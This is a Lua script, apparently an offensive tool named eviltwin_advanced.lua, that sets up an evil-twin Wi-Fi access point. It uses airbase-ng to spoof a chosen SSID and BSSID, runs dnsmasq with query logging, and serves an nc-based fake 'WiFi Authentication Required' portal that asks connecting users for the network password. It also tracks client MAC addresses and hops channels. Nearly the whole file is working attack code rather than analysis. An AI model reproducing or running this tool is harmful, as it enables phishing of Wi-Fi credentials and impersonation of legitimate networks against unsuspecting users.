#!/usr/bin/env lua

local iface = arg[1]
local ssid = arg[2] or "FreeWiFi"
local channel = tonumber(arg[3]) or 6
local bssid = arg[4] or "00:11:22:33:44:55"
local portal_port = tonumber(arg[5]) or 8080
local hop_interval = tonumber(arg[6]) or 0

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(bssid) .. ',"ssid":' .. json_escape(ssid) .. ',"channel":' .. tostring(channel) .. ',"data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local cmd = "iw dev " .. iface .. " info 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return false end
  local out = f:read("*a")
  f:close()
  if out:find("type monitor") then
    telemetry("monitor_ok", '{"message":"Monitor mode confirmed"}')
    return true
  end
  telemetry("monitor_fail", '{"message":"Interface not in monitor mode"}')
  return false
end

local function write_dnsmasq_conf()
  local conf = "interface=at0\ndhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,12h\ndhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\n"
  local f = io.open("/tmp/dnsmasq.conf", "w")
  if f then f:write(conf); f:close() end
  telemetry("config_written", '{"file":"/tmp/dnsmasq.conf"}')
end

local function write_hostapd_conf()
  local conf = "interface=at0\ndriver=nl80211\nssid=" .. ssid .. "\nhw_mode=g\nchannel=" .. tostring(channel) .. "\n"
  local f = io.open("/tmp/hostapd.conf", "w")
  if f then f:write(conf); f:close() end
  telemetry("config_written", '{"file":"/tmp/hostapd.conf"}')
end

local function write_captive_portal()
  local html = [[<!DOCTYPE html>
<html><head><title>WiFi Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial;text-align:center;margin-top:50px}
input{width:80%;padding:10px;margin:5px;font-size:16px}
button{width:80%;padding:10px;background:#4CAF50;color:white;font-size:16px;border:none}
</style></head><body>
<h2>WiFi Authentication Required</h2>
<p>Please login to access ]] .. ssid .. [[</p>
<form method='POST' action='/login'>
<input type='password' name='password' placeholder='WiFi Password' required>
<button type='submit'>Connect</button>
</form></body></html>]]
  local f = io.open("/tmp/captive_portal.html", "w")
  if f then f:write(html); f:close() end
  telemetry("portal_created", '{"file":"/tmp/captive_portal.html"}')
end

local function start_evil_twin()
  os.execute("airmon-ng check kill 2>/dev/null")
  os.execute("airbase-ng -e " .. ssid .. " -c " .. tostring(channel) .. " -a " .. bssid .. " " .. iface .. " 2>/dev/null &")
  telemetry("airbase_start", '{"ssid":' .. json_escape(ssid) .. ',"channel":' .. tostring(channel) .. '}')
  os.execute("sleep 2")
  os.execute("ifconfig at0 up 2>/dev/null")
  os.execute("ifconfig at0 192.168.1.1 netmask 255.255.255.0 2>/dev/null")
  telemetry("interface_ready", '{"interface":"at0","ip":"192.168.1.1"}')
end

local function start_services()
  write_dnsmasq_conf()
  write_hostapd_conf()
  write_captive_portal()
  os.execute("dnsmasq -C /tmp/dnsmasq.conf 2>/dev/null &")
  telemetry("dnsmasq_start", '{"pid":"started"}')
  local portal_html = io.open("/tmp/captive_portal.html", "r"):read("*a")
  io.open("/tmp/captive_portal.html", "r"):close()
  local server_cmd = "while true; do { echo -e 'HTTP/1.1 200 OK\\r\\nContent-Length: " .. tostring(#portal_html) .. "\\r\\n\\r\\n" .. portal_html .. "'; } | nc -l -p " .. tostring(portal_port) .. " -q 1 2>/dev/null; done &"
  os.execute(server_cmd)
  telemetry("portal_start", '{"port":' .. tostring(portal_port) .. ',"url":"http://192.168.1.1:' .. tostring(portal_port) .. '"}')
end

local function channel_hop()
  local channels = {1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48}
  while true do
    for _, ch in ipairs(channels) do
      os.execute("iw dev " .. iface .. " set channel " .. tostring(ch) .. " 2>/dev/null")
      telemetry("channel_hop", '{"channel":' .. tostring(ch) .. '}')
      os.execute("sleep " .. tostring(hop_interval))
    end
  end
end

local function track_clients()
  local cmd = "iw dev " .. iface .. " station dump 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return end
  local clients = 0
  while true do
    local line = f:read("*l")
    if not line then break end
    local mac = line:match("Station ([0-9a-fA-F:]+)")
    if mac then
      clients = clients + 1
      telemetry("client_connected", '{"client_mac":' .. json_escape(mac) .. '}')
    end
  end
  f:close()
  telemetry("client_track", '{"total_clients":' .. tostring(clients) .. '}')
end

if arg[1] == "--help" then
  print("Usage: eviltwin_advanced.lua <interface> [ssid] [channel] [bssid] [portal_port] [hop_interval]")
  print("Evil Twin AP with captive portal and client tracking")
  print("Set hop_interval > 0 to enable channel hopping")
  print("Example: eviltwin_advanced.lua wlan0 FreeWiFi 6 00:11:22:33:44:55 8080 0")
  os.exit(0)
end

if not iface then
  telemetry("error", '{"error":"Usage: eviltwin_advanced.lua <interface> [ssid] [channel] [bssid]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Monitor mode required on ' .. iface .. '"}')
  os.exit(1)
end

telemetry("eviltwin_start", '{"ssid":' .. json_escape(ssid) .. ',"channel":' .. tostring(channel) .. '}')

start_evil_twin()
start_services()
track_clients()

if hop_interval > 0 then
  telemetry("hop_enabled", '{"interval":' .. tostring(hop_interval) .. '}')
  channel_hop()
end

telemetry("complete", '{"ssid":' .. json_escape(ssid) .. ',"status":"running"}')
